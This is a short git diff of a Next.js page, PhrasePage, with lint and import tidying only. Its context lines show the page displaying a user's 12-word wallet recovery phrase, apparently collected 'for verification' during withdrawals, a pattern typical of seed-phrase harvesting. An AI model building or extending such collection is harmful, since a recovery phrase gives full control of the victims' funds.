@@ -5,15 +5,13 @@ import { useSession } from "next-auth/react";
 import { useRouter } from "next/navigation";
 import { motion } from "framer-motion";
 import { 
-  FaEye, 
   FaUser, 
   FaDollarSign, 
-  FaWallet, 
-  FaCalendar,
   FaShieldAlt,
   FaCheckCircle,
   FaTimesCircle,
-  FaArrowUp
+  FaArrowUp,
+  FaEye
 } from 'react-icons/fa';
 
 const cardVariants = {
@@ -327,7 +325,7 @@ export default function PhrasePage() {
                         <span className="font-semibold text-[var(--foreground)]">12-Word Recovery Phrase</span>
                       </div>
                       <div className="text-xs text-[var(--foreground)]/60 mb-3">
-                        User's recovery phrase for verification - handle with extreme care
+                        User&apos;s recovery phrase for verification - handle with extreme care
                       </div>
                       <div className="grid grid-cols-3 gap-2">
                         {withdrawal.recoveryPhrase.split(' ').map((word, index) => (
@@ -380,3 +378,6 @@ export default function PhrasePage() {
     </main>
   );
 }
+
+
+
